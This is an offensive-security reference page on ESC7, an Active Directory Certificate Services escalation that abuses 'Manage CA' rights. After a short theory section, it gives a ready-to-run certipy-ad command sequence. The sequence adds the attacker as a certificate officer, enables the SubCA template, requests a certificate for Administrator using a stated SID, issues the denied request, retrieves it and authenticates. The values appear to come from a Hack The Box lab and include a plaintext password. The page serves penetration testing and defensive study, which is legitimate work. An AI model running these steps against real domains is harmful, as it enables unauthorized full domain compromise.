# ESC7

### Theory

ESC7 addresses vulnerabilities arising from an attacker obtaining highly privileged permissions directly on a CA object within AD CS or on the CA service itself. These permissions grant significant control over the CA's operations and security. The two primary permissions of concern are:

* **`Manage CA` (CA Administrator/ManageCa):** This permission grants extensive control over the CA, including the ability to modify its configuration (e.g., which certificate templates are published), assign CA roles (including Certificate Manager/Officer, if needed), start/stop the CA service, and manage CA security. **This is the core permission that ESC7 often revolves around.**
* **`Manage Certificates` (Certificate Manager/Officer):** This permission allows a user to approve or deny pending certificate requests and to revoke issued certificates.

While `Manage Certificates` alone might have limited direct paths to privilege escalation without a pre-existing pending request for a privileged certificate, obtaining `Manage CA` rights is extremely dangerous. An attacker with `Manage CA` can often grant themselves other necessary CA roles or directly manipulate the CA configuration to facilitate the issuance of unauthorized certificates, leading to full domain compromise. For instance, having `Manage CA` might enable an attacker to also perform actions typically associated with a Certificate Officer, such as approving a request, especially if they can assign that role to themselves

### Requirements <a href="#requirements" id="requirements"></a>

ESC7 abuse requirements :

* The attacker has `Manage CA` permission on the target CA

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FmB9aSVXf0IRe0ubP29fc%2Fimage.png?alt=media&#x26;token=edf54bb2-d9aa-4ab0-80ed-e0e6013997a6" alt=""><figcaption></figcaption></figure>

### Detect <a href="#detect" id="detect"></a>

```shellscript
# Enumerate all vulnerable templates
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -stdout -enabled -vulnerable
certipy-ad find -u '<USER>@<DOMAIN>' -hashes :<NT_HASH> -dc-ip <DC_IP> -stdout -enabled -vu
```

### Exploit

A powerful method to exploit the `Manage CA` permission involves abusing the default `SubCA` certificate template. This template, intended for issuing certificates to subordinate CAs, allows enrollee-supplied subjects and has very broad EKUs. The core of the attack is using `Manage CA` rights to ensure this template is available and then facilitating the issuance of a certificate through it for a privileged identity.

The `SubCA` template is notable because it can be used for any purpose and allows the enrollee to specify the subject name. Typically, only administrators can enroll for this template. If not already enabled on the CA, a user with `Manage CA` rights can enable it. The attacker then attempts to request a certificate using `SubCA`, specifying the UPN and SID of a target privileged user (e.g., Administrator). If the attacker lacks direct enrollment rights on `SubCA`, this initial request will be denied but will generate a request ID. The private key associated with this CSR must be saved by the attacker. Leveraging their `Manage CA` capabilities (which includes the ability to manage roles and requests, effectively encompassing officer functions), the attacker can then ensure this request is approved and subsequently retrieve the certificate

```shellscript
#This command uses the Manage CA privilege to add the attacker to the officer role
# which is used to approve a certificate request
certipy-ad ca -u "raven@manager.htb" -p 'R4v3nBe5tD3veloP3r!123' -dc-ip "10.10.11.236" -ca 'manager-DC01-CA' -add-officer 'raven'

# This command uses Manage CA to make the SubCA template available for requests
certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.10.11.236' -ca 'manager-DC01-CA' -enable-template 'SubCA' 

# Get the Ainistrator's user SID
*Evil-WinRM* PS C:\Users\Raven\Desktop> (Get-LocalUser -Name Administrator).SID.Value
S-1-5-21-4078382237-1492182817-2568127209-500

# Submit a certificate request using the SubCA template (expected to fail initially if 
# no direct enrollment rights) => note the id of the key => in our example 19
certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.10.11.236' -ca 'manager-DC01-CA' -template 'SubCA' -upn 'administrator@manager.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500' 

# The attacker, leveraging the capabilities granted by Manage CA 
# (including effective officer functions), approves the previously denied request
# Use the key id retreived in the previous command
certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.10.11.236' -ca 'manager-DC01-CA' -issue-request '19' 

# The attacker retrieves the now-approved certificate, using the request ID
certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.10.11.236' -ca 'manager-DC01-CA' -retrieve '19' 

# Authenticate and gain privileged access
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 -domain manager.htb 
```
